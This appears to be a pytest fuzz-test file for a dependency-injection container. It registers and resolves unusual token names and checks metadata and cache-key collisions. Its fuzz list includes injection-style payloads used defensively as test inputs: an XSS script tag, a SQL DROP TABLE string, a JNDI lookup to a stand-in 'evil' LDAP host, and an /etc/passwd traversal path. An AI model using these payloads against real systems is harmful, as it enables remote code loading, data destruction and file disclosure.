"""
DI Fuzz tests — fuzz token names, provider metadata, and invalid registrations.
Crash inputs saved to tests/e2e/fuzz-reports/di/.
"""

import json
import os
import pytest
from aquilia.di.core import Container, ProviderMeta
from aquilia.di.providers import ValueProvider
from aquilia.di.errors import ProviderNotFoundError, DIError

FUZZ_REPORT_DIR = os.path.join(os.path.dirname(__file__), "..", "fuzz-reports", "di")


def _save_crash(test_name: str, token: str, error: str):
    """Save crash input to fuzz-reports/di/."""
    os.makedirs(FUZZ_REPORT_DIR, exist_ok=True)
    report = {"test": test_name, "token": repr(token), "error": error}
    path = os.path.join(FUZZ_REPORT_DIR, f"{test_name}.json")
    with open(path, "w") as f:
        json.dump(report, f, indent=2)


# ── Fuzz token names ────────────────────────────────────────────────

FUZZ_TOKENS = [
    "",                         # empty
    " ",                        # whitespace
    "\n\t\r",                   # control chars
    "a" * 10_000,               # extremely long
    "token\x00null",            # null byte
    "日本語トークン",              # unicode
    "<script>alert(1)</script>", # XSS-like
    "'; DROP TABLE providers;", # SQL injection pattern
    "${jndi:ldap://evil}",      # JNDI injection pattern
    "token#with#hash",          # hash delimiter
    "token\nwith\nnewlines",    # newlines in token
    "../../../etc/passwd",      # path traversal
    "AAAA" * 1000,              # buffer length
]


class TestDIFuzzTokenNames:
    """Fuzz DI token registration with unusual names."""

    @pytest.mark.parametrize("token", FUZZ_TOKENS, ids=[repr(t)[:30] for t in FUZZ_TOKENS])
    async def test_register_and_resolve_fuzz_token(self, token):
        container = Container(scope="app")
        try:
            prov = ValueProvider(value="fuzz_val", token=token, scope="singleton")
            container.register(prov)
            result = await container.resolve_async(token)
            assert result == "fuzz_val"
        except Exception as exc:
            # Record crash but don't fail — we're verifying no unhandled crash
            _save_crash("fuzz_token_register", token, str(exc))
            # Re-raise only for truly unexpected errors (segfault-level)
            if isinstance(exc, (SystemExit, KeyboardInterrupt)):
                raise

    @pytest.mark.parametrize("token", FUZZ_TOKENS, ids=[repr(t)[:30] for t in FUZZ_TOKENS])
    async def test_resolve_missing_fuzz_token(self, token):
        container = Container(scope="app")
        try:
            result = await container.resolve_async(token, optional=True)
            assert result is None
        except Exception as exc:
            _save_crash("fuzz_token_resolve_missing", token, str(exc))
            if isinstance(exc, (SystemExit, KeyboardInterrupt)):
                raise


# ── Fuzz provider metadata ──────────────────────────────────────────

class TestDIFuzzProviderMetadata:
    """Fuzz ProviderMeta fields with invalid values."""

    def test_provider_meta_with_empty_name(self):
        meta = ProviderMeta(name="", token="t", scope="singleton")
        assert meta.name == ""

    def test_provider_meta_with_very_long_token(self):
        long_token = "x" * 50_000
        meta = ProviderMeta(name="long", token=long_token, scope="singleton")
        assert len(meta.token) == 50_000

    def test_provider_meta_with_unknown_scope(self):
        meta = ProviderMeta(name="unk", token="t", scope="nonexistent_scope")
        assert meta.scope == "nonexistent_scope"

    def test_provider_meta_serialization_round_trip(self):
        meta = ProviderMeta(
            name="test",
            token="test_token",
            scope="singleton",
            tags=("tag1", "tag2"),
            module="test.module",
            qualname="TestClass",
            line=42,
        )
        d = meta.to_dict()
        assert d["name"] == "test"
        assert d["token"] == "test_token"
        assert d["tags"] == ["tag1", "tag2"]
        assert d["line"] == 42


# ── Fuzz cache key collisions ───────────────────────────────────────

class TestDIFuzzCacheKeyCollisions:
    """Cache key collision: token 'a#b' == _make_cache_key('a', 'b').
    This is an intentional limitation — the '#' separator means tokens
    containing '#' collide with tagged registrations."""

    async def test_token_with_hash_collides_with_tagged(self):
        container = Container(scope="app")
        # "a#b" ↔ make_cache_key("a", "b") — same key
        container.register(ValueProvider(value="direct", token="a#b", scope="singleton"))

        # Attempting to register (token="a", tag="b") should fail with duplicate
        with pytest.raises(ValueError, match="already registered"):
            container.register(
                ValueProvider(value="tagged", token="a", scope="singleton"), tag="b"
            )

        # The existing registration is accessible either way
        r1 = await container.resolve_async("a#b")
        assert r1 == "direct"

    async def test_non_hash_tokens_no_collision(self):
        container = Container(scope="app")
        container.register(ValueProvider(value="plain_a", token="a", scope="singleton"))
        container.register(
            ValueProvider(value="tagged_a", token="a", scope="singleton"), tag="c"
        )

        r1 = await container.resolve_async("a")
        r2 = await container.resolve_async("a", tag="c")
        assert r1 == "plain_a"
        assert r2 == "tagged_a"
